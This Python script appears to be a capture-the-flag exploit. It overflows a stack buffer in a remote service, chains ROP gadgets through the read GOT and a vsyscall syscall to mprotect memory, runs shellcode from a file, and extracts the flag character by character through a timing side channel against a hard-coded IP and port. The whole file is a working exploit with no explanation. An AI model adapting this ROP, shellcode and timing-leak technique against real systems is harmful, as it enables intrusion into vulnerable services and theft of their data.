#!/usr/bin/env python3

import time
import socket
import sys
import telnetlib
from hashlib import sha256

def _p32(num):
    return num.to_bytes(4, byteorder='little')

def _p64(num):
    return num.to_bytes(8, byteorder='little')

def u32(byte_string):
    byte4 = byte_string.ljust(4, b'\0')
    return int.from_bytes(byte4, byteorder='little')

def u64(byte_string):
    byte8 = byte_string.ljust(8, b'\0')
    return int.from_bytes(byte8, byteorder='little')

def p32(*nums):
    data = b''
    for num in nums:
        data += _p32(num)
    return data

def p64(*nums):
    data = b''
    for num in nums:
        data += _p64(num)
    return data

# This is the modified version of interact() in telnetlib.
# It can receive non-ascii data.
# Original interact() is here:
#     https://github.com/python/cpython/blob/master/Lib/telnetlib.py
def _xinteract(tel):
    import selectors
    with telnetlib._TelnetSelector() as selector:
        selector.register(tel, selectors.EVENT_READ)
        selector.register(sys.stdin, selectors.EVENT_READ)

        while True:
            for key, events in selector.select():
                if key.fileobj is tel:
                    try:
                        text = tel.read_eager()
                    except EOFError:
                        #print('*** Connection closed by remote host ***')
                        return
                    if text:
                        string = text.decode('ascii', 'backslashreplace')
                        sys.stdout.write(string)
                        sys.stdout.flush()
                elif key.fileobj is sys.stdin:
                    line = sys.stdin.readline().encode('ascii')
                    if not line:
                        return
                    tel.write(line)

class PwnSocket:
    def __init__(self, ip, port):
        self.silent_flag = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((ip, port))

    def shell(self):
        tel = telnetlib.Telnet()
        tel.sock = self.sock
        _xinteract(tel)

    def print_bytes(self, byte_str):
        if not self.silent_flag:
            string = byte_str.decode('ascii', 'backslashreplace')
            sys.stdout.write(string)
            sys.stdout.flush()

    def send(self, message):
        self.print_bytes(message)
        self.sock.send(message)

    def send_str(self, string):
        self.send(string.encode('ascii'))

    def send_int(self, num):
        self.send_str(str(num) + '\n')

    def recv_until(self, delimiter_bytes):
        received_data = b''
        while not received_data.endswith(delimiter_bytes):
            tmp = self.sock.recv(1)
            self.print_bytes(tmp)
            received_data += tmp
        return received_data

    def recv(self, num):
        data = self.sock.recv(num)
        self.print_bytes(data)
        return data

    def set_silent(self):
        self.silent_flag = True

    def unset_silent(self):
        self.silent_flag = False

def generate_candidate():
    import string
    import random
    while True:
        yield ''.join(random.choice(string.ascii_letters+string.digits) for _ in range(4)).encode('ascii')


def shellcode(index, estimated_flag):
    with open('./shellcode/shellcode', 'rb') as f:
        data = f.read()
    return p64(index) + estimated_flag.ljust(64, b'\x00') + data[8+64:]

def main(target, index, estimated_flag, limit=9.0):
    if target == 'remote':
        ip = '202.120.7.203'
        port = 666
        alarm_byte = 0x85
    else:
        hostname = 'localhost'
        ip = socket.gethostbyname(hostname)
        alarm_byte = 0x05

    if target == 'debug':
        port = 12345
    elif target == 'no-debug':
        port = 23456

    buf_size = 0x20
    read_size = 0x100
    parent_size = 0x800
    free_space = 0x601a00
    filter_allow = 0x7fff0000
    code_base = 0x400000
    sh_offset = 0x10d7 & 0xfff0
    str_offset = 0x238
    alarm_got = 0x601040
    read_got  = 0x601048
    libc_system_offset = 0x0000000000045390
    libc_puts_offset = 0x000000000006f690
    libc_base_gdb = 0x00007ffff77c8000
    mprotect_id = 10

    # rop gadget
    pop_rdi_ret = 0x400a53
    call_read   = 0x400730
    bof_read    = 0x4009af # skip (push rbp) and (mov rbp, rsp)
    add_byte_rcx_al_ret = 0x00400828
    syscall_ret = 0xffffffffff600000 + 7
    ret = 0x004006b9
    pop_many = 0x400a4a
    mov_many = 0x400a30

    ps = PwnSocket(ip, port)
    ps.set_silent()

    if target == 'remote':
        begin = time.time()
        rand_str = ps.recv_until(b'\n')[:-1]
        for can in generate_candidate():
            if sha256(rand_str + can).hexdigest().startswith('00000'):
                #print(sha256(rand_str + can).hexdigest())
                ps.send(can)
                end = time.time()
                #print('')
                #print('Timediff = {}'.format(end-begin))
                break

    rbp = free_space + buf_size
    entry_point = free_space + 0x300 + 64 + 8
    payload = b'A' * buf_size
    # call read
    payload += p64(rbp, bof_read)
    payload = payload.ljust(0x100, b'C')
    # second read
    # call read
    #payload += p64(xxx, pop_many, rbx, rbp, r12, r13, r14, r15, ret)
    #payload += p64(xxx, mov_many, xxx, xxx, xxx, rdx, rsi, edi, r12+rbx*8) # pop*7
    payload += p64(syscall_ret)
    payload = payload.ljust(0x100+buf_size, b'A')
    payload += p64(rbp, pop_many,    0,   1, read_got, 0x400, free_space+0x100, 0, mov_many)
    payload += p64(ret) * ((0x200 - len(payload)) // 8)
    # third read
    # call read in order to mov rax, 10
    payload += p64(pop_many,    0,   1, read_got, mprotect_id, alarm_got-mprotect_id+1, 0, mov_many)
    payload += p64(ret) * 7
    # call mprotect
    #payload += p64(pop_many, rbx, rbp, r12, r13, r14, r15, ret)
    #payload += p64(mov_many, xxx, xxx, xxx, rdx, rsi, edi, r12+rbx*8) # pop*7
    payload += p64(pop_many,    0,   1, alarm_got, 7, 0x1000, 0x601000, mov_many)
    payload += p64(ret) * 7
    payload += p64(entry_point)
    payload = payload.ljust(0x400, b'B')
    payload += shellcode(index, estimated_flag)
    payload = payload.ljust(0x600, b'E')
    # fourth read
    payload += alarm_byte.to_bytes(1, 'little') * mprotect_id
    #print('Start timer')
    begin = time.time()
    #print('Send payload')
    ps.send(payload.ljust(parent_size, b'\x00'))
    #print('==== pwned ====')
    ps.shell()
    #print('End timer')
    end = time.time()
    diff = end-begin
    #print('Time diff = {}'.format(diff))
    return 9.0 < diff # estimated flag is too small

def guess_single_char(target, index, flag):
    left = 0x20
    right = 0x7e
    for _ in range(7):
        mid = (right + left) // 2
        flag = flag[:index] + mid.to_bytes(1, 'little') + flag[index+1:]
        if main(target, index, flag):
            left = mid
        else:
            right = mid
    return right.to_bytes(1, 'little')

def solve(target):
    import tqdm
    flag = b'flag{12345678901234567890123456789012345678901234567890123456789'
    for i in tqdm.tqdm(range(5,len(flag))):
        real_flag = guess_single_char(target, i, flag)
        flag = flag[:i] + real_flag + flag[i+1:]
        with open('flag.txt', 'ab') as f:
            f.write(real_flag)
        if real_flag == b'}':
            break
    print(flag)

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '--remote':
        target = 'remote'
    elif len(sys.argv) == 2 and sys.argv[1] == '--no-debug':
        target = 'no-debug'
    else:
        target = 'debug'
    solve(target)
